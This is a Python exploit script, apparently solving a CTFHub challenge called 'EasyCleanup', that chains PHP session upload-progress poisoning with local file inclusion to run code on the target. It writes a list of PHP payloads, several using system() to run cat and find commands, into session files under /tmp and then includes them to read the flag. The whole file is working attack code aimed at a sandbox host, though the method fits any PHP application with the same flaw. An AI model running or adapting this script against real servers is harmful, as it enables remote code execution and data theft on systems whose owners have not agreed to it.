#!/usr/bin/env python3
"""Get flag from EasyCleanup via session file inclusion."""
import requests
import re

target = 'http://challenge-c295913eebc950ce.sandbox.ctfhub.com:10800'

# Try different payloads to read flag
payloads = [
    "<?php include 'flag.php'; echo $flag; ?>",
    "<?php show_source('flag.php'); ?>",
    "<?php system('cat /usr/local/lib/php/flag.php'); ?>",
    "<?php system('cat /flag*'); ?>",
    "<?php system('cat /flag'); ?>",
    "<?php system('find / -name flag* -exec cat {} \;'); ?>",
    "<?php include 'flag.php'; var_dump(get_defined_vars()); ?>",
    "<?php include 'flag.php'; print_r($GLOBALS); ?>",
]

for i, payload in enumerate(payloads):
    session_id = f'a{i}'
    session_file = f'/tmp/sess_{session_id}'

    # Write session file
    files = {'file': ('test.txt', b'x' * 5000, 'text/plain')}
    data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}
    requests.post(
        f'{target}/',
        files=files,
        data=data,
        cookies={'PHPSESSID': session_id},
        timeout=15
    )

    # Include session file
    r = requests.get(f'{target}/', params={'file': session_file}, timeout=10)

    # Extract flag
    flags = re.findall(r'ctfhub\{[^}]+\}', r.text)
    if flags:
        print(f'FLAG FOUND: {flags[0]}')
        print(f'Payload: {payload[:60]}')
        break
    else:
        # Show non-HTML extra content
        text = re.sub(r'<[^>]+>', '', r.text)
        # Skip the PHP source code and look for extra content
        if 'endif' in text:
            # Find content after the PHP source ends
            end_idx = text.rfind('?&gt;')
            if end_idx > 0:
                extra = text[end_idx+5:end_idx+500].strip()
                if extra:
                    print(f'[{i}] Extra content: {extra[:200]}')
                else:
                    print(f'[{i}] No extra content beyond PHP source')
            else:
                print(f'[{i}] No closing tag found, text len={len(r.text)}')
        else:
            print(f'[{i}] Response len={len(r.text)}, searching for clues...')
            # Look for any non-HTML content
            for keyword in ['flag', 'ctfhub', 'flag{']:
                if keyword in r.text.lower():
                    idx = r.text.lower().find(keyword)
                    snippet = r.text[max(0,idx-30):idx+100]
                    print(f'  Found "{keyword}": ...{snippet}...')
